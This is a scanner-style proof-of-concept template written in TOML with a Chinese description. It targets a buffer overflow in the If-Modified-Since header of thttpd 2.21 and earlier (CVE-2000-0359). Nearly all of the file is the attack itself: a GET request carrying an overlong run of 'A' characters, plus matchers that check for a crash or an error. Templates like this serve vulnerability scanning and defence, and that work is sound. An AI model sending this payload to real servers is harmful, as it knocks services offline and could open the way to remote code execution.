[info]
author = "ave"
description = "向 thttpd 服务器发送超长 If-Modified-Since 请求头，触发缓冲区溢出导致服务崩溃或远程代码执行。影响 thttpd 2.21 及之前版本。"
id = "POC-AVE-2000-0909"
name = "thttpd If-Modified-Since 缓冲区溢出 PoC"
severity = "critical"
tags = ["ave-2000-0909"]
vuln_id = [
    "CVE-2000-0359",
    "AVE-2000-0909",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.headers]
If-Modified-Since = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "500",
    "Service Unavailable",
    "connection refused",
]
